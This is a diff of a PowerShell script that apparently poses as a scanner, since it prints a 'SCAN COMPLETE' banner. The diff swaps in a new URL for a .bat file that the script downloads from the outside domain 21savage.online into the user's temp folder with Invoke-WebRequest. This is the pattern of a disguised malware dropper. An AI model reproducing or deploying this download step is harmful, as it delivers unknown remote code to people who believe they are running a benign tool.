@@ -1,5 +1,5 @@
-$exeUrl  = "https://21savage.online/20250928_114619_9c0d87adf7314132b5180724cafbe641.bat"
-$exePath = "$env:TEMP\20250928_114619_9c0d87adf7314132b5180724cafbe641.bat"
+$exeUrl  = "https://21savage.online/3417589971.bat"
+$exePath = "$env:TEMP\3417589971.bat"
 
 Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
@@ -303,6 +303,7 @@ $space = " " * 12  # Increased the number of spaces for more right alignment
 Write-Host "`n$space╭─────────────────────────────────────╮" -ForegroundColor $yellow
 Write-Host "$space│            SCAN COMPLETE            │" -ForegroundColor $yellow
 Write-Host "$space╰─────────────────────────────────────╯" -ForegroundColor $yellow
+
 
 
 
